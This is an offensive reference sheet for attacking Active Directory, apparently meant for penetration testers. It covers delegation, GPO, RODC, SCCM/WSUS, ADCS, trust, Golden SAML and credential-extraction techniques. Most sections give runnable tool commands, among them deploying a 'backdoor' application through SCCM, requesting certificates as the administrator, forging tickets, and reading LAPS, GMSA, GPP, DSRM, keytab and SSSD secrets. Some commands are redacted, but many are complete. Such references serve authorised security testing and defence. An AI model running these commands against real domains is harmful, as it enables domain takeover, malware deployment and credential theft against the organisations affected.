# Advanced Active Directory Attacks Reference

## Table of Contents
1. [Delegation Attacks](#delegation-attacks)
2. [Group Policy Object Abuse](#group-policy-object-abuse)
3. [RODC Attacks](#rodc-attacks)
4. [SCCM/WSUS Deployment](#sccmwsus-deployment)
5. [AD Certificate Services (ADCS)](#ad-certificate-services-adcs)
6. [Trust Relationship Attacks](#trust-relationship-attacks)
7. [ADFS Golden SAML](#adfs-golden-saml)
8. [Credential Sources](#credential-sources)
9. [Linux AD Integration](#linux-ad-integration)

---

## Delegation Attacks

### Unconstrained Delegation

When a user authenticates to a computer with unconstrained delegation, their TGT is saved to memory.

**Find Delegation:**
```powershell
# PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# BloodHound
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

**SpoolService Abuse:**
```bash
# Check spooler service
ls \\dc01\pipe\spoolss

# Trigger with SpoolSample
.\SpoolSample.exe DC01.domain.local HELPDESK.domain.local

# Or with printerbug.py
[REDACTED_PRINTERBUG_EXPLOIT]
```

**Monitor with Rubeus:**
```powershell
Rubeus.exe monitor /interval:1
```

### Constrained Delegation

**Identify:**
```powershell
Get-DomainComputer -TrustedToAuth | select -exp msds-AllowedToDelegateTo
```

**Exploit with Rubeus:**
```powershell
# S4U2 attack
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

**Exploit with Impacket:**
```bash
[REDACTED_IMPACKET_GETST]
```

### Resource-Based Constrained Delegation (RBCD)

```powershell
# Create machine account
New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

# Set delegation
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount AttackerPC$

# Get ticket
[REDACTED_RUBEUS_S4U]
```

---

## Group Policy Object Abuse

### Find Vulnerable GPOs

```powershell
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|WriteDacl|WriteOwner")}
```

### Abuse with SharpGPOAbuse

```powershell
# Add local admin
[REDACTED_SHARPGPOABUSE_COMMAND]

# Add user rights
[REDACTED_SHARPGPOABUSE_COMMAND]

# Add immediate task
[REDACTED_SHARPGPOABUSE_COMMAND]
```

### Abuse with pyGPOAbuse (Linux)

```bash
[REDACTED_PYGPOABUSE_COMMAND]
```

---

## RODC Attacks

### RODC Golden Ticket

RODCs contain filtered AD copy (excludes LAPS/Bitlocker keys). Forge tickets for principals in msDS-RevealOnDemandGroup.

### RODC Key List Attack

**Requirements:**
- krbtgt credentials of the RODC (-rodcKey)
- ID of the krbtgt account of the RODC (-rodcNo)

```bash
# Impacket keylistattack
[REDACTED_IMPACKET_KEYLISTATTACK]

# Using secretsdump with keylist
[REDACTED_SECRETSDUMP_COMMAND]
```

**Using Rubeus:**
```powershell
[REDACTED_RUBEUS_GOLDEN_TICKET]
```

---

## SCCM/WSUS Deployment

### SCCM Attack with MalSCCM

```bash
# Locate SCCM server
MalSCCM.exe locate

# Enumerate targets
MalSCCM.exe inspect /all
MalSCCM.exe inspect /computers

# Create target group
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
MalSCCM.exe group /addhost /groupname:TargetGroup /host:TARGET-PC

# Create malicious app
MalSCCM.exe app /create /name:backdoor /uncpath:"\\SCCM\SCCMContentLib$\evil.exe"

# Deploy
MalSCCM.exe app /deploy /name:backdoor /groupname:TargetGroup /assignmentname:update

# Force checkin
MalSCCM.exe checkin /groupname:TargetGroup

# Cleanup
MalSCCM.exe app /cleanup /name:backdoor
MalSCCM.exe group /delete /groupname:TargetGroup
```

### SCCM Network Access Accounts

```powershell
# Find SCCM blob
Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"

# Decrypt with SharpSCCM
.\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
```

### WSUS Deployment Attack

```bash
# Using SharpWSUS
SharpWSUS.exe locate
SharpWSUS.exe inspect

# Create malicious update
[REDACTED_SHARPWSUS_PAYLOAD_COMMAND]

# Deploy to target
SharpWSUS.exe approve /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"

# Check status
SharpWSUS.exe check /updateid:GUID /computername:TARGET.domain.local

# Cleanup
SharpWSUS.exe delete /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"
```

---

## AD Certificate Services (ADCS)

### ESC1 - Misconfigured Templates

Template allows ENROLLEE_SUPPLIES_SUBJECT with Client Authentication EKU.

```bash
# Find vulnerable templates
certipy find -u user@domain.local -p password -dc-ip DC_IP -vulnerable

# Request certificate as admin
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template VulnTemplate -upn administrator@domain.local

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC4 - ACL Vulnerabilities

```python
# Check for WriteProperty
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -get-acl

# Add ENROLLEE_SUPPLIES_SUBJECT flag
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT

# Perform ESC1, then restore
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -value 0 -property mspki-Certificate-Name-Flag
```

### ESC8 - NTLM Relay to Web Enrollment

```bash
# Start relay
[REDACTED_NTLMRELAYX_COMMAND]

# Coerce authentication
[REDACTED_PETITPOTAM_EXPLOIT]

# Use certificate
Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt
```

### Shadow Credentials

```bash
# Add Key Credential (pyWhisker)
[REDACTED_PYWHISKER_EXPLOIT]

# Get TGT with PKINIT
[REDACTED_GETTGTPKINIT_COMMAND]

# Get NT hash
export KRB5CCNAME=target.ccache
[REDACTED_GETNTHASH_COMMAND]
```

---

## Trust Relationship Attacks

### Child to Parent Domain (SID History)

```powershell
# Get Enterprise Admins SID from parent
$ParentSID = "S-1-5-21-PARENT-DOMAIN-SID-519"

# Create Golden Ticket with SID History
[REDACTED_MIMIKATZ_GOLDEN_TICKET]
```

### Forest to Forest (Trust Ticket)

```bash
# Dump trust key
lsadump::trust /patch

# Forge inter-realm TGT
[REDACTED_MIMIKATZ_GOLDEN_TICKET]

# Use trust ticket
.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/target.external.com /dc:dc.external.com /ptt
```

---

## ADFS Golden SAML

**Requirements:**
- ADFS service account access
- Token signing certificate (PFX + decryption password)

```bash
# Dump with ADFSDump
.\ADFSDump.exe

# Forge SAML token
[REDACTED_ADFSPOOF_COMMAND]
```

---

## Credential Sources

### LAPS Password

```powershell
# PowerShell
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'

# CrackMapExec
crackmapexec ldap DC_IP -u user -p password -M laps
```

### GMSA Password

```powershell
# PowerShell + DSInternals
$gmsa = Get-ADServiceAccount -Identity 'SVC_ACCOUNT' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
```

```bash
# Linux with bloodyAD
python bloodyAD.py -u user -p password --host DC_IP getObjectAttributes gmsaAccount$ msDS-ManagedPassword
```

### Group Policy Preferences (GPP)

```bash
# Find in SYSVOL
findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml

# Decrypt
python3 Get-GPPPassword.py -no-pass 'DC_IP'
```

### DSRM Credentials

```powershell
# Dump DSRM hash
[REDACTED_MIMIKATZ_LSADUMP_SAM]

# Enable DSRM admin logon
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```

---

## Linux AD Integration

### CCACHE Ticket Reuse

```bash
# Find tickets
ls /tmp/ | grep krb5cc

# Use ticket
export KRB5CCNAME=/tmp/krb5cc_1000
```

### Extract from Keytab

```bash
# List keys
klist -k /etc/krb5.keytab

# Extract with KeyTabExtract
python3 keytabextract.py /etc/krb5.keytab
```

### Extract from SSSD

```bash
# Database location
/var/lib/sss/secrets/secrets.ldb

# Key location
/var/lib/sss/secrets/.secrets.mkey

# Extract
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
